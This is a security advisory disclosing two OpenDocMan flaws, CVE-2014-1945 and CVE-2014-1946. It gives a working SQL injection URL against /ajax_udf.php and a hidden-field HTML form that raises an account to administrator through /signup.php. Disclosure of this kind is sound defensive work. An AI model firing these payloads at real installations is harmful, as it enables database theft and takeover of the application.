Advisory Details:

High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in OpenDocMan, which can be exploited to perform SQL Injection and gain administrative access to the application.

1) SQL Injection in OpenDocMan: CVE-2014-1945

The vulnerability exists due to insufficient validation of "add_value" HTTP GET parameter in "/ajax_udf.php" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.

The exploitation example below displays version of the MySQL server:

http://[host]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,v
ersion%28%29,3,4,5,6,7,8,9

2) Improper Access Control in OpenDocMan: CVE-2014-1946

The vulnerability exists due to insufficient validation of allowed action in "/signup.php" script when updating userâ??s profile. A remote authenticated attacker can assign administrative privileges to the current account and gain complete control over the application.

The exploitation example below assigns administrative privileges for the current account:

<form action="http://[host]/signup.php" method="post" name="main">
<input type="hidden" name="updateuser" value="1">
<input type="hidden" name="admin" value="1">
<input type="hidden" name="id" value="[USER_ID]">
<input type="submit" name="login" value="Run">
</form>
